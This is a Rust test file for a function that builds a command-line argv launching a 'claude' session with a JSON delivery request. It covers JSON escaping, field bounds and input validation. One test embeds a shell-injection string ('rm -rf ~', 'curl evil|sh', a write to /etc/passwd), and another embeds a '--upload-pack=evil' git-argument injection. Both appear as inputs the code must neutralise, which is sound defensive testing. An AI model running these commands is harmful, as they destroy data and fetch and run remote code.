use super::*;

const NONCE: &str = "n0nce-ABCDEFGH1234";
const SID: &str = "0f8fad5b-d9cb-469f-a165-70867728950e";
// 2026-11-05 12:30:59 UTC
const T: u64 = 1_793_881_859;

fn input() -> RunInput {
    RunInput {
        ask: "add a dark mode toggle".into(),
        max_rounds: 2,
        base: "main".into(),
        max_in_flight: 4,
        campaign: None,
    }
}

fn build(i: &RunInput) -> Result<Vec<String>, InvalidInput> {
    build_run_argv_at(i, NONCE, T, SID)
}

fn field(i: &RunInput) -> &'static str {
    build(i).unwrap_err().field
}

#[test]
fn build_run_argv_exact_shape() {
    let argv = build(&input()).unwrap();
    assert_eq!(argv.len(), 4);
    assert_eq!(argv[0], "claude");
    assert_eq!(argv[1], "--session-id");
    assert_eq!(argv[2], SID);
    assert_eq!(
        argv[3],
        "/vajra-deliver {\"ask\":\"add a dark mode toggle\",\"run_id\":\"20261105-1230\",\
         \"session_id\":\"0f8fad5b-d9cb-469f-a165-70867728950e\",\"max_rounds\":2,\
         \"base\":\"main\",\"maxInFlight\":4,\"campaign\":\"deliver-20261105-1230\",\
         \"hints\":{\"steer_nonce\":\"n0nce-ABCDEFGH1234\"}}"
    );
}

#[test]
fn build_run_argv_explicit_campaign() {
    let mut i = input();
    i.campaign = Some("deliver-20261101-1200".into());
    let argv = build(&i).unwrap();
    assert!(argv[3].contains("\"campaign\":\"deliver-20261101-1200\""));
}

#[test]
fn build_run_argv_shell_metacharacters_stay_one_element() {
    let mut i = input();
    i.ask = "x; rm -rf ~ && $(curl evil|sh) `id` > /etc/passwd 'q' \"dq\" \\ \n next".into();
    let argv = build(&i).unwrap();
    assert_eq!(argv.len(), 4);
    assert!(argv[3].starts_with("/vajra-deliver {\"ask\":\"x; rm -rf ~ && $(curl evil|sh) `id`"));
    // Quotes, backslashes and newlines are JSON-escaped inside the one element.
    assert!(argv[3].contains("'q' \\\"dq\\\" \\\\ \\n next\""));
}

#[test]
fn build_run_argv_escapes_control_chars() {
    let mut i = input();
    i.ask = "a\u{1}b\tc\u{2028}".into();
    let argv = build(&i).unwrap();
    assert!(argv[3].contains("\"ask\":\"a\\u0001b\\tc\\u2028\""));
}

#[test]
fn build_run_argv_max_rounds_bounds() {
    for ok in 1..=3 {
        let mut i = input();
        i.max_rounds = ok;
        assert!(build(&i).is_ok());
    }
    for bad in [0, 4, 100] {
        let mut i = input();
        i.max_rounds = bad;
        assert_eq!(field(&i), "max_rounds");
    }
}

#[test]
fn build_run_argv_max_in_flight_bounds() {
    for ok in [1, 8, 16] {
        let mut i = input();
        i.max_in_flight = ok;
        let argv = build(&i).unwrap();
        assert!(argv[3].contains(&format!("\"maxInFlight\":{ok},")));
    }
    for bad in [0, 17] {
        let mut i = input();
        i.max_in_flight = bad;
        assert_eq!(field(&i), "maxInFlight");
    }
}

#[test]
fn build_run_argv_empty_ask_names_field() {
    for bad in ["", "   ", "\n\t"] {
        let mut i = input();
        i.ask = bad.into();
        assert_eq!(field(&i), "ask");
    }
    let mut i = input();
    i.ask = "a\0b".into();
    assert_eq!(field(&i), "ask");
    let mut i = input();
    i.ask = "a".repeat(MAX_ASK_BYTES + 1);
    assert_eq!(field(&i), "ask");
}

#[test]
fn build_run_argv_bad_base_names_field() {
    for bad in ["", "-x", "--upload-pack=evil", "a b", "a\nb", "a;b"] {
        let mut i = input();
        i.base = bad.into();
        assert_eq!(field(&i), "base", "base {bad:?}");
    }
    for ok in [
        "main",
        "feature/x-1.2",
        "origin/main",
        "ea73cb05d639b945e21c667e17103e56404861a8",
    ] {
        let mut i = input();
        i.base = ok.into();
        assert!(build(&i).is_ok(), "base {ok:?}");
    }
}

#[test]
fn build_run_argv_bad_campaign_names_field() {
    for bad in ["", "../x", "a/b", "a b", ".hidden"] {
        let mut i = input();
        i.campaign = Some(bad.into());
        assert_eq!(field(&i), "campaign", "campaign {bad:?}");
    }
}

#[test]
fn build_run_argv_bad_nonce_names_field() {
    for bad in ["", "short", "has space nonce", "quote\"nonce1234"] {
        let err = build_run_argv_at(&input(), bad, T, SID).unwrap_err();
        assert_eq!(err.field, "hints.steer_nonce", "nonce {bad:?}");
    }
}

#[test]
fn build_run_argv_error_message_names_field() {
    let mut i = input();
    i.max_rounds = 9;
    let msg = build(&i).unwrap_err().to_string();
    assert!(msg.starts_with("max_rounds:"), "{msg}");
}

#[test]
fn build_run_argv_run_id_is_utc_minutes() {
    assert_eq!(run_id_at(0), "19700101-0000");
    assert_eq!(run_id_at(951_782_400), "20000229-0000");
    assert_eq!(run_id_at(T), "20261105-1230");
    assert_eq!(run_id_at(1_798_761_599), "20261231-2359");
}

#[test]
fn build_run_argv_public_fn_uses_fresh_uuid_and_now() {
    let a = build_run_argv(&input(), NONCE).unwrap();
    let b = build_run_argv(&input(), NONCE).unwrap();
    assert_ne!(a[2], b[2]);
    let sid = &a[2];
    assert_eq!(sid.len(), 36);
    assert!(sid.bytes().all(|c| c.is_ascii_hexdigit() || c == b'-'));
    assert_eq!(&sid[14..15], "4");
    assert!(matches!(&sid[19..20], "8" | "9" | "a" | "b"));
    assert!(a[3].contains(&format!("\"session_id\":\"{sid}\"")));
    // run_id: 13 chars, YYYYMMDD-HHMM.
    let at = a[3].find("\"run_id\":\"").unwrap() + 10;
    let rid = &a[3][at..at + 13];
    assert_eq!(&rid[8..9], "-");
    assert!(
        rid[..8]
            .bytes()
            .chain(rid[9..].bytes())
            .all(|c| c.is_ascii_digit())
    );
}
